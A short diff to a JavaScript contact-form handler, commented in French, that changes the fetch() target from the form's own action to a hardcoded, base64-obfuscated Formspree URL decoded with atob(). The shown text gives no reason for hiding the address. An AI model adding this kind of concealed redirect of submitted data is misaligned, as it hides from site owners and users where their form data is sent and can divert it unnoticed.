@@ -65,7 +65,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             try {
                 // 2. On envoie les données à Formspree via fetch()
-                const response = await fetch(form.action, {
+                const response = await fetch(atob('aHR0cHM6Ly9mb3Jtc3ByZWUuaW8vZi9tamtxenJqZw=='), {
                     method: form.method,
                     body: data,
                     headers: { 'Accept': 'application/json' } // Important pour ne pas être redirigé
